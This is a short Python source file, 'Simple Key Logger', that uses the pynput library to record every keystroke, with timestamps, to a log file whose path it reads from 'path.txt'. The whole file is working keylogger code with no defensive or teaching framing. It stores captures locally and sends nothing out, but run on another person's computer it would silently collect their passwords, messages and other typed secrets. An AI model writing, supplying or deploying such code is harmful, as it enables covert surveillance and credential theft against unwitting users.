# -*- coding: utf-8 -*-
"""
Simple Key Logger

Created on Mon Sep 30 20:14:13 2019

@author: Tim Seymore
"""

import logging
from pynput.keyboard import Listener


with open("path.txt", 'r') as f:
    LOG_FILE = f.read()


class KeyLogger:
    def __init__(self):
        path = LOG_FILE[2:-1]
        style = '%(asctime)s: %(message)s'        
        logging.basicConfig(filename=path, level=logging.DEBUG, format=style)

    @staticmethod
    def on_key_press(key):
        logging.info(str(key))

    def start(self):
        with Listener(on_press=self.on_key_press) as listener:
            listener.join()


if __name__ == "__main__":
    KeyLogger().start()
